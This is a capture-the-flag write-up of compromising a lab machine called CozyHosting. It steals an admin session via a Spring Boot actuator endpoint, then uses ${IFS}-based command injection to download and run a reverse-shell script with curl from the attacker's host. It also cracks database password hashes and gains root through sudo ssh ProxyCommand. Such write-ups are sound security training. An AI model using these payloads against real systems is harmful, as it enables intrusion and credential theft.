### Summary
We start the box with access to a `SpringBoot` website and perform subdirectory bruteforce with a `SpringBoot` wordlist to find `actuator` endpoints. We enumerate a find the `actuator/sessions`, allowing us to steal an admin user's session and access the admin panel. We explore and exploit a command injection vulnerability via the admin panel to get a shell as `app`. We unarchive the webservice's `jar` file to find `PostGreSQL` credentials which we use to dump user hashes that crack with `hashcat` giving us `ssh` access as `josh` who is able to run `ssh` via `sudo`, giving us easy privesc

### Tools
- `ffuf`
- `feroxbuster`
- `burp`
- `psql`
- `hashcat`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Brute-forcing]]
- [[#HTTP - TCP 80]]
###### [[#User Shell - app]]
- [[#Session Stealing]]
- [[#Command Injection]]
- [[#Enumeration as app]]
###### [[#User Shell - josh]]
- [[#psql]]
- [[#hashcat]]
###### [[#Root Shell]]
- [[#Enumeration as josh]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.229.88 -oN nmap/tcp
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.229.88 -oN nmap/tcpScripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL indicates a posix adherent system
- OpenSSH and nginx versions imply Ubuntu `22.04`
- Subdomains or virtual hosting is in play with the web server, we'll use `ffuf` to probe it

### Subdomain Brute-forcing
```sh
❯ ffuf -u http://10.129.229.88 -H "Host: FUZZ.cozyhosting.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
...
```
- We didn't get anything
- We can add `cozyhosting.htb` to our `/etc/hosts` file 
- We run `nmap -p 80 -sCV` again but we don't see anything interesting

## HTTP - TCP 80
---
- We navigate to the website to see a project hosting service
- `wappalyzer` indicates we're running `nginx` on `bootstrap` with `java` programming language, implying we might be working with `SpringBoot`
- Lots of the pages end with the `.html` extension
- There's a `login` endpoint that indicates its run by [BootstrapMade](https://bootstrapmade.com/)

- We can run `feroxbuster` on the site
```sh
❯ feroxbuster -u "http://cozyhosting.htb" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt -x html        
...
401      GET        1l        1w       97c http://cozyhosting.htb/admin
204      GET        0l        0w        0c http://cozyhosting.htb/logout
```
- There's an `admin` endpoint that returns with `401` and redirects us to `/login`
- The `/login` subdirectory doesn't trigger recursion, but running `feroxbuster` against it doesn't show anything interesting

- There's a `SpringBoot` wordlist in SecLists that we can try against the site
```sh
❯ feroxbuster -u "http://cozyhosting.htb/" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/spring-boot.txt -x html

http://cozyhosting.htb/actuator
http://cozyhosting.htb/actuator/env
http://cozyhosting.htb/actuator/env/lang
http://cozyhosting.htb/actuator/env/home
http://cozyhosting.htb/actuator/env/path
http://cozyhosting.htb/actuator/sessions
http://cozyhosting.htb/actuator/health
http://cozyhosting.htb/actuator/beans
http://cozyhosting.htb/actuator/mappings
```

- `SpringBoot` includes features designed for monitoring, managing, and debugging applications known as actuators. `actuator/mappings` gives a detailed list abt the application, including actuators and endpoints
```sh
❯ curl -s http://cozyhosting.htb/actuator/mappings | jq -c '.contexts.application.mappings.dispatcherServlets.dispatcherServlet | .[] | [.handler, .predicate]'

["Actuator web endpoint 'beans'","{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'health-path'","{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'mappings'","{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator root web endpoint","{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'env'","{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'env-toMatch'","{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'sessions'","{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["Actuator web endpoint 'health'","{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"]
["org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)","{ [/error]}"]
["org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)","{ [/error], produces [text/html]}"]
["htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)","{POST [/executessh]}"]
["ParameterizableViewController [view=\"admin\"]","/admin"]
["ParameterizableViewController [view=\"addhost\"]","/addhost"]
["ParameterizableViewController [view=\"index\"]","/index"]
["ParameterizableViewController [view=\"login\"]","/login"]
["ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]","/webjars/**"]
["ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]","/**"]
```
- Some interesting endpoints
	- `/actuators/sessions`
	- `/addhost`
	- `/executessh`

- The `/actuators/sessions` endpoint is very interesting
```sh
❯ curl -s http://cozyhosting.htb/actuator/sessions | jq
{
  "6226EDE80874B54251396F80F5AC6B4E": "kanderson"
}
```
- Looks like we have a cookie for the user `kanderson`

# User Shell - app
## Session Stealing
---
- We can use `kanderson`'s cookie and plug it into our browser's cookies to find an admin dashboard when we access the `/login` endpoint
- There's nothing very interesting on this dashboard except for a host automatic patching service, allowing us to input usernames and hostnames
- We can put some dummy information and our IP as the hostname and we see the following error
```text
#### The host was not added!
ssh: connect to host 10.10.15.234 port 22: Connection timed out
```

- We can capture the request in `burp`
```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=3B04C08C8162C472CE36E36B5A2EF47E
Content-Length: 34

host=10.10.15.234&username=wallfly
```
- which redirects to 
```http
GET /admin?error=ssh:%20connect%20to%20host%2010.10.15.234%20port%2022:%20Connection%20timed%20out HTTP/1.1
Host: cozyhosting.htb
Cookie: JSESSIONID=3B04C08C8162C472CE36E36B5A2EF47E
Referer: http://cozyhosting.htb/executessh
```

- We can try again except with `localhost` and we get the error `Host Key verification failed`
- Probing for command injection, if we fill the hostname with 
	- `;ping 10.10.15.234 -c 1` 
	- We get `Invalid Hostname` indicating sanitization
- If we place our `ping` payload in the `username` field, we get `Username can't contain whitespaces`
	- There are a few ways to [bypass whitespace sanitization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-without-space) 
	- We'll use `{IFS}`, a special shell variable called the Internal Field Separator
- If we set the username to `wallfly;ping${IFS}10.10.15.234${IFS}-c${IFS}1` we get the error `ssh: Could not resolve hostname wallfly: Temporary failure in name resolutionping: invalid argument: '1@10.10.15.234'`

## Command Injection
---
- The command we're injecting into is something along the lines of 
	- `ssh -i [key] [username]@[hostname]`
	- `ssh -i [key] wallfly;ping 10.10.15.234 -c 1@10.10.15.234`
		- It should be fixed if we add a comment at the end of the `username`

- When we set the username to `wallfly;ping${IFS}10.10.15.234${IFS}-c1;#`
	- `wallfly; ping 10.10.15.234 -c1;#`
- We see through our tcpdump that we get a ping!
```sh
❯ sudo tcpdump -i tun0 icmp
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:29:54.446411 IP cozyhosting.htb > fedora-laptop: ICMP echo request, id 1, seq 1, length 64
02:29:54.446541 IP fedora-laptop > cozyhosting.htb: ICMP echo reply, id 1, seq 1, length 64
```

- Now let's try to send a reverse shell payload!
- **WARNING** Java applications are extremely sensitive when attempting to call reverse shells. The easiest method is to transfer shell scripts over and then execute them
```http
wallfly;curl${IFS}http://10.10.15.234:12345/rev.sh${IFS}-o${IFS}/tmp/rev.sh;#

wallfy;chmod${IFS}+x${IFS}/tmp/rev.sh;#

wallfly;/tmp/rev.sh;#
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.229.88.
Ncat: Connection from 10.129.229.88:47374.
bash: cannot set terminal process group (993): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ 
```

## Enumeration as app
---
- We can enumerate users by checking the `/etc/passwd` file
```sh
app@cozyhosting:/app$ grep -E sh$ /etc/passwd 
root:x:0:0:root:/root:/bin/bash
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```
- `josh` is the only user with a home directory

- In `/app` there's a `cloudhosting-0.0.1.jar` file
- We can transfer it to a writable directory and unzip it and in short order we come across `application.properties`
```text
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
- Looks like we've got postgresql database creds `postgres:Vg&nvzAQ7XxR`
- Given the `spring.datasource.url` we can assume the database is `cozyhosting`

# User Shell - josh
## psql
---
- We can connect to the `postgreSQL` `cozyhosting` DB as user `postgres` like so:
```sh
app@cozyhosting:/tmp/BOOT-INF/classes$ psql -h localhost cozyhosting postgres
```

- We can type `\d` to list all tables, views, and sequences
```sql
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
```

- We can type `\d users` to describe the `users` table
```sql
                        Table "public.users"
  Column  |          Type          | Collation | Nullable | Default 
----------+------------------------+-----------+----------+---------
 name     | character varying(50)  |           | not null | 
 password | character varying(100) |           | not null | 
 role     | role                   |           |          | 
Indexes:
    "users_pkey" PRIMARY KEY, btree (name)
Referenced by:
    TABLE "hosts" CONSTRAINT "hosts_username_fkey" FOREIGN KEY (username) REFERENCES users(name)
```

- We can get all the data from the `users` table with a typical `SQL` query, `select * from users;`
```sql
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

## hashcat
---
- We can create a file that has both hashes in the format `username:hash` and pass it to `hashcat` with the `--user` flag to brute-force
```sh
❯ hashcat hashes -m 3200 --user ~/ctf/TOOLS/wordlist/rockyou.txt 
...
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

- We can verify the creds work over `ssh` with `nxc`
```sh
❯ nxc ssh 10.129.229.88 -u josh -p manchesterunited               
SSH         10.129.229.88   22     10.129.229.88    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
SSH         10.129.229.88   22     10.129.229.88    [+] josh:manchesterunited  Linux - Shell access!
```

# Root Shell
## Enumeration as josh
---
- We can nab `user.txt`
```sh
josh@cozyhosting:~$ cat user.txt 
67ef7b5d23bfa808cce0f31fa0a2fbb4
```

- We can see if `josh` is able to run any commands as `sudo` with `sudo -l`
```sh
josh@cozyhosting:~$ sudo -l 
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

- This should be an easy one, we'll check [ssh via GTFObins](https://gtfobins.org/gtfobins/ssh/)
```sh
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
# whoami
root
# cat /root/root.txt
e91d75d1304b560965eb66830ee78149
```
